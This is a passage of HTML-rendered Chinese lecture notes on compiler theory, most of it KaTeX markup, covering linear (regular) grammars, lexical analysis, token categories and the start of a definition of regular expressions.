style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span></span>或者<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，其中<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo separator=\"true\">,</mo><mi>B</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><mi>α</mi><mo>∈</mo><msubsup><mi>V</mi><mi>T</mi><mo>∗</mo></msubsup></mrow><annotation encoding=\"application/x-tex\">A,B \\in V_{N}, \\alpha \\in V_{T}^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.964027em;vertical-align:-0.275331em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-2.424669em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.275331em;\"><span></span></span></span></span></span></span></span></span></span>，则称其为<strong>右线性文法</strong>。</li>\n<li>若每条规则的形式为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>B</mi><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow B \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>或者<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，其中<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo separator=\"true\">,</mo><mi>B</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><mi>α</mi><mo>∈</mo><msubsup><mi>V</mi><mi>T</mi><mo>∗</mo></msubsup></mrow><annotation encoding=\"application/x-tex\">A,B \\in V_{N}, \\alpha \\in V_{T}^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.964027em;vertical-align:-0.275331em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-2.424669em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.275331em;\"><span></span></span></span></span></span></span></span></span></span>，则称其为<strong>左线性文法</strong>。</li>\n</ul>\n<p>左、右线性文法都被称为3型文法、正规文法，其语言为正规语言。</p>\n<p>从0型文法到3型文法，对规则的限制逐渐增加，每一种文法都是前一种文法的<strong>子文法</strong>。</p>\n<h2 id=\"词法分析和有穷自动机\"><a class=\"markdownIt-Anchor\" href=\"#词法分析和有穷自动机\"></a> 词法分析和有穷自动机</h2>\n<h3 id=\"词法分析程序\"><a class=\"markdownIt-Anchor\" href=\"#词法分析程序\"></a> 词法分析程序</h3>\n<p>词法分析程序是语法分析程序的一个子程序（子类），每当语法分析程序需要一个单词符号时，就调用词法分析程序的API，让词法分析程序从输入的String中，识别出一个具有独立意义的token。</p>\n<h3 id=\"token\"><a class=\"markdownIt-Anchor\" href=\"#token\"></a> Token</h3>\n<h4 id=\"token简介\"><a class=\"markdownIt-Anchor\" href=\"#token简介\"></a> token简介</h4>\n<p>词法分析程序的输入是String形式的<strong>source program</strong>，输出tokens。这样的过程叫做tokenization。</p>\n<p>token是语言中具有独立意义的最小语法单位。一般分为5种：</p>\n<ol>\n<li>keyword\t比如：if, else, while, do等</li>\n<li>identifier\t比如：对象名、函数名等</li>\n<li>constant\t包括stringConstant、intConstant、floatConstant和boolConstant</li>\n<li>operator\t包括加减乘除等</li>\n<li>punctuator\t包括分号，逗号，括号等</li>\n</ol>\n<h4 id=\"输出token的形式\"><a class=\"markdownIt-Anchor\" href=\"#输出token的形式\"></a> 输出token的形式</h4>\n<p>以以下形式输出token：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mo fence=\"true\">(</mo><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mo separator=\"true\">,</mo><mtext> </mtext><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>V</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo fence=\"true\">)</mo></mrow><annotation encoding=\"application/x-tex\">\\left(tokenType,\\ tokenValue\\right)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">e</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">e</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span></span></p>\n<ol>\n<li>每一个tokenType对应一个整数编码。</li>\n<li>当一个tokenType里只含有一种value时，该整数编码就完全代表了value，因此value可以省略。</li>\n</ol>\n<h4 id=\"token的两种定义\"><a class=\"markdownIt-Anchor\" href=\"#token的两种定义\"></a> token的两种定义</h4>\n<h5 id=\"正规文法左线型文法或者右线性文法\"><a class=\"markdownIt-Anchor\" href=\"#正规文法左线型文法或者右线性文法\"></a> 正规文法（左线型文法或者右线性文法）</h5>\n<p>正规文法定义token易于识别，以identifier举例：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mo>&lt;</mo><mi>i</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>e</mi><mi>r</mi><mo>&gt;</mo><mo>→</mo><mi>l</mi><mi mathvariant=\"normal\">∣</mi><mo>&lt;</mo><mi>i</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>e</mi><mi>r</mi><mo>&gt;</mo><mi>l</mi><mi mathvariant=\"normal\">∣</mi><mo>&lt;</mo><mi>i</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>e</mi><mi>r</mi><mo>&gt;</mo><mi>d</mi><mspace linebreak=\"newline\"></mspace><mi>l</mi><mo>:</mo><mtext> </mtext><mi>a</mi><mo>∼</mo><mi>z</mi><mtext> </mtext><mi>o</mi><mi>r</mi><mtext> </mtext><mi>A</mi><mo>∼</mo><mi>Z</mi><mspace linebreak=\"newline\"></mspace><mi>d</mi><mo>:</mo><mtext> </mtext><mn>0</mn><mo>∼</mo><mn>9</mn></mrow><annotation encoding=\"application/x-tex\">&lt;identifier&gt; \\rightarrow l|&lt;identifier&gt;l|&lt;identifier&gt;d \\\\\nl:\\ a\\sim z \\  or\\  A \\sim Z\\\\\nd:\\ 0\\sim 9\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.36687em;vertical-align:0em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\"> </span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∼</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.04398em;\">z</span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∼</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\"> </span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∼</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">9</span></span></span></span></span></p>\n<h5 id=\"正规式-regular-expression\"><a class=\"markdownIt-Anchor\" href=\"#正规式-regular-expression\"></a> 正规式 regular expression</h5>\n<p>设存在字母表<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi><mo>=</mo><mrow><mo fence=\"true\">{</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>a</mi><mi>n</mi></msub><mo fence=\"true\">}</mo></mrow></mrow><annotation encoding=\"application/x-tex\">\\Sigma = \\left \\{a_{1}, a_{2},...,a_{n}\\right\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span></span></span></span>，在其上的正规式与正规式表示的正规集用以下（递归）规则定义：</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">∅</mi></mrow><annotation encoding=\"application/x-tex\">\\varnothing</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66334em;vertical-align:-0.08167em;\"></span><span class=\"mord amsrm\">∅</span></span></span></span>是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>上的正规式，表示的正规集也是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">∅</mi></mrow><annotation encoding=\"application/x-tex\">\\varnothing</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66334em;vertical-align:-0.08167em;\"></span><span class=\"mord amsrm\">∅</span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>上的正规式，表示的正规集是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mo fence=\"true\">{</mo><mi>ϵ</mi><mo fence=\"true\">}</mo></mrow><annotation encoding=\"application/x-tex\">\\left\\{\\epsilon\\right\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord mathdefault\">ϵ</span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">a_{i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>上的正规式，表示的正规集是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mo fence=\"true\">{</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence=\"true\">}</mo></mrow><annotation encoding=\"application/x-tex\">\\left\\{a_{i}\\right\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span></span></span></span>。</li>\n<li>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">e_{1}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">e_{2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span 